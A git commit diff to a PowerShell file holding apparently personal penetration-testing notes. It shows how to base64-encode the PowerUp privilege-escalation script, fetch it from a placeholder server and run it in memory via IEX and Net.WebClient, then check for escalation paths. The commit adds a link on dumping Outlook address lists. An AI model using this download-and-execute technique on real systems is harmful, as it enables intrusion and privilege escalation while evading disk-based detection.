1300d015b67327cdb2d4df08b824c62fadcec4fc
Shad0w-Eagle <167417449+Shad0w-Eagle@users.noreply.github.com>
2025-02-25 17:35:43 +0530

    Update runme.ps1

--- runme.ps1
+++ runme.ps1
@@ -3,3 +3,5 @@ Write-Host "Tester Test"
 2. encode with base64 on personal machine with command $base64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content "D:\ad\PowerUp.ps1" -Raw))) $base64 | Out-File "D:\ad\powerup.base64" 
 3. If you have in same network with your assessment pc decode and execute the ps1 in memory with command: IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://yourserver.com/powerup.base64')))) 
 4. If successfully executed use command invoke-allchecks to check possible vuln for priv escalation.
+
+https://www.ired.team/offensive-security/enumeration-and-discovery/dumping-gal-global-address-list-from-outlook-web-application
